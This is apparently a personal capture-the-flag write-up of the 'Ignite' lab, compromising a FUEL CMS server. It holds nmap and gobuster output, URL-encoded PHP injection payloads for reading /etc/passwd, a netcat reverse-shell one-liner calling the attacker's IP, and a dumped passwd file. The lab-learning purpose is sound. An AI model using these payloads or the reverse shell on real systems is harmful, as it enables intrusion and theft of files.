# Ignite -> A new start-up has a few issues with their web server.

```
export IP=10.10.192.215
```

- Took my first look at the `robots.txt` file and got some clues already. :)
- Nmap scan came back and doesnt look encouraging at all.
```
Starting Nmap 7.70 ( https://nmap.org ) at 2020-07-20 16:13 GMT
Nmap scan report for 10.10.192.215
Host is up (0.54s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

```

- Results from gobuster scan.
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 200)
/assets (Status: 301)
/home (Status: 200)
/index.php (Status: 200)
/index (Status: 200)
/offline (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)

```

- Something tells me that `/fuel` path that has a disallowed access is fishy.

- got some payload of the internet 
```
http://10.10.192.215/fuel/pages/select/?nocache=1507880376191&input=&target=&title=&class=&pdfs=&filter=%3C%3F%20phpinfo%28%29%3B%20%20%3F%3E

%3C%3F%20include_path%3D%27/etc/passwd%27%3B%20%20%3F%3E

%3C%3F%20include_path%3D%27/../../../../../etc/passwd%27%3B%20%20%3F%3E

%3C%3F%20include%20%27/etc/passwd%27%3B%20%20%3F%3E

%3C%3F+include+%27%2Fetc%2Fpasswd%27%3B++%3F%3E

%27%2b phpinfo() %2b%27
```

- It works now i just have to build my payload and use it to read some daunting files from the system.
- Ive tried things, nothing works on the website and it gives no info. Went to read some walkthroughs and stuff like that. Even went to look for vulnerabilities associated with the version of fuel cms used but it still gave me headache. I have not given up.. i am just going to learn new ways LOL.

- I got an exploit that allowed remote code execution on the target system, through fuel cms. About to get reverse shell now.
```
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.29.246 9999 >/tmp/f"

```

- /etc/passwd file
```
systemroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false

```
